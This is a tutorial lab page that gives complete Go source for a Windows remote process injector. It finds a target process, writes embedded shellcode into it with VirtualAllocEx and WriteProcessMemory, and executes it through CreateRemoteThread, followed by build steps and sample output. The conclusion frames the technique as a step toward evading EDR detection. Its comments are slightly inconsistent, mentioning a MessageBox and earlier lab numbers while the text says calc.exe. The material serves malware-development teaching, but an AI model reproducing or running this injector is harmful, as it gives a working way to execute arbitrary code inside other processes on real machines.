---
showTableOfContents: true
title: "Executing Code via CreateRemoteThread (Lab 10.3)"
type: "page"
---


## Goal
In the previous two labs of this module we successfully found and opened a target process (Lab 10.1) and then allocated, written to, and modified memory within it (Lab 10.2). The final piece of the standard WinAPI process injection puzzle is triggering the execution of our payload (shellcode) within that remote process context. As discussed in the preceding lesson, the `CreateRemoteThread` function is the standard way to achieve this.

Specifically, in this lab we will:
1.  Combine the code from Labs 10.1 and 10.2 to find a target process and get a handle.
2.  Allocate ReadWrite (RW) memory remotely using `VirtualAllocEx`.
3.  Write our `calc.exe` shellcode into the remote memory using `WriteProcessMemory`.
4.  Change the remote memory's protection to ReadExecute (RX) using `VirtualProtectEx`.
5.  Use `CreateRemoteThread` to start a new thread in the target process, with its starting address pointing to our shellcode buffer.
6.  Verify that the shellcode executes successfully in the target process.

## Code

*(Note: This code integrates logic from Labs 2.1 & 2.2 and adds the execution step. A simple MessageBox shellcode is used here for demonstration.)*

```go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"log"
	"os"
	"strings"
	"unsafe"

	"github.com/zzl/go-win32api/v2/win32" 
	"golang.org/x/sys/windows"            
)

// Shellcode (remains the same)
var shellcode = []byte{
	0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
	0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
	0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
	0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
	0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
	0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
}

// findProcessPID (remains the same)
func findProcessPID(targetName string) (uint32, error) {
	fmt.Printf("[*] Searching for process: %s\n", targetName)

	handle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
	}
	defer windows.CloseHandle(handle)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(handle, &entry)
	if err != nil {
		return 0, fmt.Errorf("Process32First failed: %w", err)
	}

	for {
		processName := windows.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(processName, targetName) {
			fmt.Printf("[+] Found target process '%s' with PID: %d\n", targetName, entry.ProcessID)
			return entry.ProcessID, nil
		}

		err = windows.Process32Next(handle, &entry)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return 0, fmt.Errorf("Process32Next failed: %w", err)
		}
	}
	return 0, fmt.Errorf("process '%s' not found", targetName)
}

func main() {
	fmt.Println("[+] WinAPI Process Injection Tool")

	if len(os.Args) < 2 {
		fmt.Printf("Usage: %s <target_process_name.exe>\n", os.Args[0])
		fmt.Println("Example: .\\injector.exe notepad.exe")
		return
	}
	targetProcessName := os.Args[1]

	targetPID, err := findProcessPID(targetProcessName)
	if err != nil {
		log.Fatalf("[-] Failed to find PID: %v", err)
	}

	// hProcess is windows.Handle, which is uintptr. win32.HANDLE is also uintptr.
	// We will cast hProcess to win32.HANDLE where needed for zzl/go-win32api calls.
	hProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|
		windows.PROCESS_QUERY_INFORMATION|
		windows.PROCESS_VM_OPERATION|
		windows.PROCESS_VM_WRITE|
		windows.PROCESS_VM_READ, false, targetPID)
	if err != nil {
		log.Fatalf("[-] OpenProcess failed: %v", err)
	}
	fmt.Printf("[+] Successfully obtained handle: 0x%X\n", hProcess)
	// Defer closing using windows.CloseHandle, as hProcess is windows.Handle
	defer windows.CloseHandle(hProcess)

	shellcodeLen := uintptr(len(shellcode))
	fmt.Printf("[*] Allocating %d bytes in target process (RW)...\n", shellcodeLen)

	// Using win32.VirtualAllocEx from zzl/go-win32api
	remoteAddrPtr, allocErrCode := win32.VirtualAllocEx(
		win32.HANDLE(hProcess), // Cast windows.Handle to win32.HANDLE
		nil,
		shellcodeLen,
		win32.MEM_COMMIT|win32.MEM_RESERVE,
		win32.PAGE_READWRITE,
	)
	if allocErrCode != win32.NO_ERROR {
		log.Fatalf("[-] win32.VirtualAllocEx failed (Error code: %d)", allocErrCode)
	}
	if remoteAddrPtr == nil {
		log.Fatalf("[-] win32.VirtualAllocEx returned nil address.")
	}
	remoteAllocatedAddress := uintptr(remoteAddrPtr) // For use with windows package functions that take uintptr
	fmt.Printf("[+] Allocated %d bytes at remote address: 0x%X\n", shellcodeLen, remoteAllocatedAddress)

	defer func(addrToFree uintptr) {
		if addrToFree == 0 {
			return
		}
		fmt.Println("[*] Freeing remote memory...")
		// Using win32.VirtualFreeEx from zzl/go-win32api
		_, freeErrCode := win32.VirtualFreeEx(
			win32.HANDLE(hProcess),
			unsafe.Pointer(addrToFree), // remoteAddrPtr could also be used here directly
			0,
			win32.MEM_RELEASE,
		)
		if freeErrCode != win32.NO_ERROR {
			log.Printf("[!] Warning: win32.VirtualFreeEx failed (Error code: %d)", freeErrCode)
		} else {
			fmt.Println("[+] Remote memory freed.")
		}
	}(remoteAllocatedAddress)

	var bytesWritten uintptr
	// Using windows.WriteProcessMemory from golang.org/x/sys/windows
	fmt.Printf("[*] Writing %d bytes of shellcode to remote address 0x%X...\n", shellcodeLen, remoteAllocatedAddress)
	err = windows.WriteProcessMemory(hProcess, remoteAllocatedAddress, &shellcode[0], shellcodeLen, &bytesWritten)
	if err != nil {
		log.Fatalf("[-] WriteProcessMemory failed: %v", err)
	}
	if bytesWritten != shellcodeLen {
		log.Fatalf("[-] WriteProcessMemory: incomplete write (%d/%d bytes)", bytesWritten, shellcodeLen)
	}
	fmt.Printf("[+] Successfully wrote %d bytes.\n", bytesWritten)

	var oldProtect uint32
	// Using windows.VirtualProtectEx from golang.org/x/sys/windows
	fmt.Printf("[*] Changing protection of remote address 0x%X to PAGE_EXECUTE_READ (0x%X)...\n", remoteAllocatedAddress, windows.PAGE_EXECUTE_READ)
	err = windows.VirtualProtectEx(hProcess, remoteAllocatedAddress, shellcodeLen, windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		log.Fatalf("[-] VirtualProtectEx failed: %v", err)
	}
	fmt.Printf("[+] Protection changed successfully. Old protection was: 0x%X\n", oldProtect)

	// --- Create Remote Thread using win32.CreateRemoteThread from zzl/go-win32api ---
	fmt.Printf("[*] Creating remote thread with win32.CreateRemoteThread starting at address 0x%X...\n", remoteAllocatedAddress)
	var threadId uint32
	var hWin32Thread win32.HANDLE    // To store the handle from win32.CreateRemoteThread
	var crtErrCode win32.WIN32_ERROR // To store the error code

	// Corrected call to win32.CreateRemoteThread:
	hWin32Thread, crtErrCode = win32.CreateRemoteThread(
		win32.HANDLE(hProcess), // hProcess is windows.Handle, cast to win32.HANDLE
		nil,                    // lpThreadAttributes (*win32.SECURITY_ATTRIBUTES)
		uintptr(0),             // dwStackSize (uintptr)
		win32.LPTHREAD_START_ROUTINE(unsafe.Pointer(remoteAllocatedAddress)), // lpStartAddress (LPTHREAD_START_ROUTINE is unsafe.Pointer)
		unsafe.Pointer(uintptr(0)), // lpParameter (unsafe.Pointer)
		0,                          // dwCreationFlags (uint32)
		&threadId,                  // lpThreadId (*uint32)
	)

	if crtErrCode != win32.NO_ERROR {
		log.Fatalf("[-] win32.CreateRemoteThread failed (Error code: %d)", crtErrCode)
	}
	fmt.Printf("[+] Successfully created remote thread with Handle: 0x%X and ID: %d\n", hWin32Thread, threadId)
	fmt.Println("[+] Check the target process for payload execution (e.g., MessageBox)...")

	// --- Optional: Wait for the thread and close handle ---
	// WaitForSingleObject and CloseHandle from golang.org/x/sys/windows expect windows.Handle.
	// win32.HANDLE and windows.Handle are both uintptr, so direct use or casting is fine.
	hThreadForWait := windows.Handle(hWin32Thread) // Explicit cast for clarity/safety

	event, err := windows.WaitForSingleObject(hThreadForWait, windows.INFINITE)
	if err != nil {
		log.Printf("[!] Warning: WaitForSingleObject failed: %v", err)
	} else {
		fmt.Printf("[*] Remote thread finished with wait status: 0x%X\n", event)
	}

	errClose := windows.CloseHandle(hThreadForWait)
	if errClose != nil {
		log.Printf("[!] Warning: Failed to close remote thread handle: %v", errClose)
	} else {
		fmt.Println("[*] Remote thread handle closed.")
	}

	fmt.Println("[+] Injection attempt complete.")
}


````


## Code Breakdown


**Shellcode Variable:**
- Defines our`shellcode` as a global byte slice containing the machine code to launch `calc.exe`.

**findProcessPID Function:**
- This function finds and returns the target process PID. It uses functions from `golang.org/x/sys/windows` (`CreateToolhelp32Snapshot`, `Process32First`, `Process32Next`, `CloseHandle`).

**Argument Parsing:**
- Checks for the target process name from command-line arguments using `os.Args`.

**PID Retrieval:**
- Calls `findProcessPID` to get the PID of the `targetProcessName`.

**OpenProcess:**
- Opens the target process with specified access rights (`PROCESS_CREATE_THREAD`, `PROCESS_QUERY_INFORMATION`, `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, `PROCESS_VM_READ`), obtaining `hProcess`.
- A `defer windows.CloseHandle(hProcess)` ensures the handle is closed on exit.

**VirtualAllocEx (using zzl/go-win32api):**
- Passes the process handle (`win32.HANDLE(hProcess)`), `nil` for address, `shellcodeLen`, allocation type constants (`win32.MEM_COMMIT | win32.MEM_RESERVE`), and protection flags (`win32.PAGE_READWRITE`).
- Receives the remote base address `remoteAddrPtr`.


**Deferred VirtualFreeEx (using zzl/go-win32api):**
- A `defer` statement to ensure remote memory is freed using `win32.HANDLE(hProcess)`, the allocated address, `0` for size, and `win32.MEM_RELEASE`.

**WriteProcessMemory (using x/sys/windows):**
- Calls `windows.WriteProcessMemory` using `hProcess`, the `remoteAllocatedAddress` (`uintptr` version of `remoteAddrPtr`), a pointer to the `shellcode`, its length, and a pointer to `bytesWritten`.

**VirtualProtectEx (using x/sys/windows):**
- Calls `windows.VirtualProtectEx` using `hProcess`, `remoteAllocatedAddress`, `shellcodeLen`, the new protection constant `windows.PAGE_EXECUTE_READ`, and a pointer to `oldProtect`.

**CreateRemoteThread (using zzl/go-win32api):**
- Calls `win32.CreateRemoteThread` from `github.com/zzl/go-win32api/v2/win32`.
- Passes `win32.HANDLE(hProcess)`, `nil` for attributes, `0` for stack size, the `remoteAllocatedAddress` (cast to `win32.LPTHREAD_START_ROUTINE`), `nil` for parameter, `0` for creation flags, and a pointer to `threadId`.
- Obtains `hWin32Thread` (a `win32.HANDLE`).

**WaitForSingleObject (using x/sys/windows):**
- Calls `windows.WaitForSingleObject` using `windows.Handle(hWin32Thread)` and `windows.INFINITE` to wait for the remote thread.

**CloseHandle for Thread (using x/sys/windows):**
- Calls `windows.CloseHandle` on `windows.Handle(hWin32Thread)` to close the remote thread handle.











## Instructions

Remember we'll need to import both dependencies again in case you've created a new project.

```shell
go get "github.com/zzl/go-win32api/v2/win32" 

go get "golang.org/x/sys/windows"  
```


You should now be able to compile your code using `go build`.

```shell
GOOS=windows GOARCH=amd64 go build -buildvcs=false 
```


In case it's required, transfer the binary over to the target system.

Open your target process, in my case I'll once again use `notepad.exe`.

Then, in a terminal with Administrative privileges, run your injector + pass the name of the target process as the sole argument.

```shell
.\injector.exe notepad.exe
```



## Results

Running our injector should produce the following output if successful:
```go
PS C:\Users\vuilhond\Desktop> .\injector.exe notepad.exe
[+] WinAPI Process Injection Tool
[*] Searching for process: notepad.exe
[+] Found target process 'notepad.exe' with PID: 9704
[+] Successfully obtained handle: 0x184
[*] Allocating 105 bytes in target process (RW)...
[+] Allocated 105 bytes at remote address: 0x21028210000
[*] Writing 105 bytes of shellcode to remote address 0x21028210000...
[+] Successfully wrote 105 bytes.
[*] Changing protection of remote address 0x21028210000 to PAGE_EXECUTE_READ (0x20)...
[+] Protection changed successfully. Old protection was: 0x4
[*] Creating remote thread with win32.CreateRemoteThread starting at address 0x21028210000...
[+] Successfully created remote thread with Handle: 0x180 and ID: 5256
[+] Check the target process for payload execution (e.g., MessageBox)...
[*] Remote thread finished with wait status: 0x0
[*] Remote thread handle closed.
[+] Injection attempt complete.
[*] Freeing remote memory...
[+] Remote memory freed.
```


And of course, once again we expect to see `calc.exe` popping up on screen.

## Discussion

This lab demonstrates the "classical" remote process injection workflow using the Windows API from Go. We successfully placed shellcode into a target process (`notepad.exe`) and triggered its execution using `CreateRemoteThread`.

## Conclusion

This technique achieves the goal of running code under the context of another process. However, as I've mentioned a few times, this entire sequence is heavily monitored by EDRs and constitutes a strong set of indicators for malicious activity. So though this forms a good conceptual foundation, there's still many steps and paradigm shifts ahead before we can launch a process with the confidence that it won't get detected.




---
